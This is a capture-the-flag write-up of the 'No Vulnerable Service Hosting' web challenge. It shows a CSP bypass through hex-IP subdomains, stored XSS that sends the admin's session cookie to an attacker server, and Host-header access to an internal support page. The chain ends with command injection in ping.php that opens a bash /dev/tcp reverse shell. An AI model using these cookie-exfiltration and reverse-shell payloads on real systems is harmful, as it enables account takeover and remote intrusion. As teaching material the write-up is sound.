## No Vulnerable Service Hosting  

### Description  
No Vulnerable Services is a company founded on the idea that all websites should be secure. We use the latest web security standards, and provide complementary pentests of all customer sites with our exclusive NoPwn® guarantee.  

Be #unhackable.™  

## Vulnerability  
By taking a brief look at the index page we notice registration page POST request which we can send a description including our email address to company. Admin will take a look at it afterwards.  

Interesting thins is the SOP policy of requests sent to the server:  

```
Content-Security-Policy:  
default-src 'none';  
script-src *.no.vulnerable.services https://www.google.com/ https://www.gstatic.com/;  
style-src *.no.vulnerable.services https://fonts.googleapis.com/ 'unsafe-inline';  
img-src *.no.vulnerable.services;  
font-src *.no.vulnerable.services https://fonts.gstatic.com/;  
frame-src https://www.google.com/  
```  

So, basically we cannot use payloads like the following:  

`<img src=x onerror="var xhr=new XMLHttpRequest(); xhr.open('GET', 'http://{{server_ip}}/cookie.php?c='+ btoa(document.body.innerHTML), false); xhr.send();">`  

The reason is that xhr or fetch gonna get blocked by `default-src: None` policy of CSP. So, in order to execute javascript code on client-side we need to take over one of the sub-domains under `*.no.vulnerable.services` and place our scripts there.  

Then I started using dig to get information about `no.vulnerable.services` domain as the following:  

`dig no.vulnerable.services` : `216.165.2.40`  

Now by taking a closer look at another clue on the page, I noticed this text in the body of index.  

`Served By: d8a50228.ip.no.vulnerable.services in 0.39ms`  

By digging that, I found that interestingly both of the addresses are the same:  

`dig d8a50228.ip.no.vulnerable.services` : `216.165.2.40`  

So, I just tried to find the pattern and I converted hex letters to integer equivalent and I got it's the same.  

`0xd8 = 216, 0xa5 = 165, 0x02 = 2, 0x28 = 40`  

So, what if I convert my servers ip address to this notation? like `{{converted_ip_to_hex}}.ip.no.vulnerable.services`.  Bingo I got this:  

`23e25ca4.ip.no.vulnerable.services. 5 IN A      35.226.92.164`  

Now, let's host a script on our server to read document.cookie back to our server and then checking logs to see if we can leak admin cookies:  

Obviously as I described the following payload should work because it's on the same sub-domain:  

```javascript
var xhr=new XMLHttpRequest();  
xhr.open('GET', 'http://23e25ca4.ip.no.vulnerable.services/cookie.php?c='+ btoa(document.cookie), false);  
xhr.send();  
```  

The content of description sent to Admins:  

```javascript
<script src="http://23e25ca4.ip.no.vulnerable.services/error.js"></script>
```

```
And we can see in access.logs the following:  
216.165.2.40 - - [19/Sep/2018:17:41:29 -0700] "GET /error.js HTTP/1.1" 200 558 "http://admin.no.vulnerable.services/review.php?id=2561" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/69.0.3497.81 HeadlessChrome/69.0.3497.81 Safari/537.36"
216.165.2.40 - - [19/Sep/2018:17:41:30 -0700] "GET /cookie.php?c=UEhQU0VTU0lEPXNrNGRhNDkxMzJncHUyMGVvNjJsZ3I5c25o HTTP/1.1" 200 429 "http://admin.no.vulnerable.services/review.php?id=2561" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/69.0.3497.81 HeadlessChrome/69.0.3497.81 Safari/537.36"
```  

Cookie has been based64 encoded, after decoding we're going to have the following:  

`PHPSESSID=sk4da49132gpu20eo62lgr9snh`  

We need to add this cookie to page by updating DOM of page using `document.cookie`:  

`document.cookie="PHPSESSID=sk4da49132gpu20eo62lgr9snh"`  

Then we got access to main page of admin located at:  

`http://admin.no.vulnerable.services/`  

DIG shows the same IP address for this domain but there's a load balancer functionality which is located under `http://admin.no.vulnerable.services/lb.php`.  

Obviously we can see there's another IP address `216.165.2.41` and there're some internal IP addresses working in internal network and communicating with this IP. (May be some sort of NAT...)  

The other page is Support under `http://support.no.vulnerable.services/`, but it's not accessible from outside through internet.  

But when we perform DIG we can find an IP address for that which is as the following:  

`support.no.vulnerable.services. 5 IN    A       172.16.2.5`  

So, I tried to use curl to get access through `216.165.2.41` to this internal domain by converting it's IP address to the domain format accepted by server:  

`curl -vvv http://216.165.2.41/ -H 'Host: ac100205.ip.no.vulnerable.services'`  

Bingo!! here's the other page:  

```html
<html>  
        <head>  
                <title>NVS INTERNAL - Support</title>  
        </head>  
        <body>  
                <h1>NVS Support</h1>  
                <h3>General Debugging Steps</h3>  
                <ol>  
                        <li>Tell the customer to turn it off and back on again.</li>  
                        <li>Blame the customer for making a change.</li>  
                        <li>Use the tools below to check for networking issues.</li>  
                </ol>  
                <hr/>  
                <h3>Tools</h3>  
                <p>Ping</p>  
                <form action="ping.php" method="get">  
                        <input type="text" name="dest" placeholder="IP or hostname" />  
                        <input type="submit" value="Ping" />  
                </form>  
        </body>  
</html>  
```  

There's a command injection at `dest` parameter of `ping.php` page. But we need to url encode our payload, and to get reverse shell I gonna use raw tcp sockets like the following:  

`curl -vvv http://216.165.2.41/ping.php?dest=%60bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/35.226.92.164/443%200%3E%261%27%60 -H 'Host: ac100205.ip.no.vulnerable
.services'`  

Flag:  

```
www-data@c6b174e1cad7:/var/www/html$ ls  
ls  
flag.txt  
index.php  
ping.php  
www-data@c6b174e1cad7:/var/www/html$ cat flag.txt  
cat flag.txt  
flag{7672f158167cab32aebc161abe0fbfcaee2868c1}  
```  

Sincerely,  
Mohsen (@pwnslinger) from @shellphish  
